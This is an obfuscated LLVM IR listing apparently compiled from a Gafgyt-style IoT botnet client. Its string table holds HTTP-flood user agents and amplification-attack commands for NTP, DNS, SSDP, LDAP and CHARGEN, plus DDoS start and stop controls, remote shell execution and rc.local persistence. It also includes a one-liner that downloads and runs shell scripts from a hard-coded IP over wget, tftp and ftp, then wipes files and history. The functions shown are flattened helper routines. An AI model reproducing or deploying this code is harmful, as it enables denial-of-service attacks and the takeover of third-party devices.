@.str.488 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.489 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.490 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.491 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.492 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.493 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.494 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.495 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.496 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.497 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.502 = private unnamed_addr constant [8 x i8] c"CHARGEN\00", align 1
@.str.503 = private unnamed_addr constant [40 x i8] c"cd; ./chargen %s %s chargen.txt 2 -1 %s\00", align 1
@.str.504 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.505 = private unnamed_addr constant [34 x i8] c"cd; ./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.506 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.507 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.508 = private unnamed_addr constant [4 x i8] c"NTP\00", align 1
@.str.509 = private unnamed_addr constant [29 x i8] c"cd; ./ntp %s %s ntp.txt 2 %s\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"SSDP\00", align 1
@.str.511 = private unnamed_addr constant [34 x i8] c"cd; ./ssdp %s %s ssdp.txt 2 -1 %s\00", align 1
@.str.512 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.513 = private unnamed_addr constant [32 x i8] c"cd; ./dns %s %s dns.txt 2 -1 %s\00", align 1
@.str.514 = private unnamed_addr constant [4 x i8] c"TS3\00", align 1
@.str.515 = private unnamed_addr constant [44 x i8] c"cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s\00", align 1
@.str.516 = private unnamed_addr constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://46.101.35.30/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 46.101.35.30 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 46.101.35.30; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.35.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00", align 1
@.str.517 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.518 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.519 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.520 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.521 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"HUMANS SHUTTING DOWN\00", align 1
@.str.523 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.524 = private unnamed_addr constant [47 x i8] c"\1B[0;36mHUMANS SEARCHING ON | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.525 = private unnamed_addr constant [23 x i8] c"IMAASSHOLETHATBOTKILLS\00", align 1
@.str.526 = private unnamed_addr constant [24 x i8] c"HUMANS KILLING | IP: %s\00", align 1
@.str.527 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.528 = private unnamed_addr constant [4 x i8] c"AMP\00", align 1
@.str.529 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.530 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.531 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.532 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.533 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.534 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.535 = private unnamed_addr constant [13 x i8] c"DDOS STOPPED\00", align 1
@.str.536 = private unnamed_addr constant [16 x i8] c"NO DDOS STOPPED\00", align 1
@.str.537 = private unnamed_addr constant [7 x i8] c"HAHANO\00", align 1
@.str.538 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.539 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.540 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.541 = private unnamed_addr constant [6 x i8] c"HUMAN\00", align 1
@.str.542 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.543 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.544 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.546 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.547 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.548 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.549 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.550 = private unnamed_addr constant [44 x i8] c"\1B[0;36mNEW %s CONNECTED | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.551 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.552 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.553 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.554 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.555 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.556 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.557 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 437415745, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 437415745, label %10
    i32 185544312, label %14
    i32 1417429244, label %32
    i32 -646574983, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 185544312, i32 -646574983
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 1417429244, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 437415745, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1343310585, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1343310585, label %first
    i32 958027905, label %30
    i32 200551156, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 958027905, i32 200551156
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 200551156, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1257238393, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1257238393, label %10
    i32 1460820672, label %20
    i32 1098957342, label %23
    i32 243391340, label %24
    i32 -29747460, label %29
    i32 -1711146933, label %38
    i32 1388661273, label %40
    i32 952370343, label %43
    i32 -2077379638, label %45
    i32 -1419575335, label %50
    i32 1705636094, label %62
    i32 836715090, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1460820672, i32 1098957342
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -1257238393, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 243391340, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -29747460, i32 -1711146933
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 -1711146933, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 1388661273, i32 952370343
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 243391340, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -2077379638, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -1419575335, i32 836715090
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1705636094, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -2077379638, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -522418850, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -522418850, label %12
    i32 -1471031931, label %18
    i32 -924330155, label %24
    i32 1973179976, label %32
    i32 1204003706, label %33
    i32 1262696169, label %39
    i32 1138552198, label %40
    i32 -275693344, label %46
    i32 994796649, label %49
    i32 2135632222, label %50
    i32 1508666896, label %56
    i32 -1092296313, label %61
    i32 98484675, label %62
    i32 891720479, label %68
    i32 -533116669, label %73
    i32 -155671471, label %75
    i32 1814784490, label %84
    i32 -1634373194, label %87
    i32 1914891268, label %93
    i32 1191624076, label %99
    i32 240837177, label %105
    i32 2002569438, label %110
    i32 1615032417, label %118
    i32 574842506, label %120
    i32 -484416685, label %121
    i32 -1194414398, label %127
    i32 805110482, label %133
    i32 -1982388577, label %140
    i32 2048180947, label %146
    i32 -194771535, label %151
    i32 1668417038, label %158
    i32 1647886917, label %164
    i32 -1063110101, label %171
    i32 -557847143, label %177
    i32 -1089165656, label %182
    i32 1200731590, label %189
    i32 966469798, label %195
    i32 504239420, label %202
    i32 -2117681251, label %208
    i32 1313322315, label %213
    i32 908459457, label %220
    i32 1301608270, label %226
    i32 -706615006, label %233
    i32 -411734558, label %239
    i32 -1279561209, label %244
    i32 98146341, label %251
    i32 -278204659, label %257
    i32 -665176535, label %263
    i32 955737541, label %269
    i32 1294346230, label %274
    i32 -224555710, label %286
    i32 -1781296604, label %287
    i32 -913690677, label %288
    i32 -1364502889, label %295
    i32 -1944855197, label %296
    i32 -21740906, label %299
    i32 1982393874, label %303
    i32 1053877051, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1471031931, i32 -21740906
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -924330155, i32 -1781296604
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1973179976, i32 1204003706
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -21740906, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 1262696169, i32 1138552198
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -913690677, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -275693344, i32 994796649
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 994796649, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 2135632222, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 1508666896, i32 -1092296313
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 2135632222, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 98484675, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 891720479, i32 -533116669
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -533116669, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -155671471, i32 -1634373194
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 1814784490, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 98484675, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 1914891268, i32 -1194414398
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1191624076, i32 240837177
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 2002569438, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 2002569438, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 1615032417, i32 574842506
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -484416685, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -484416685, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.558, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
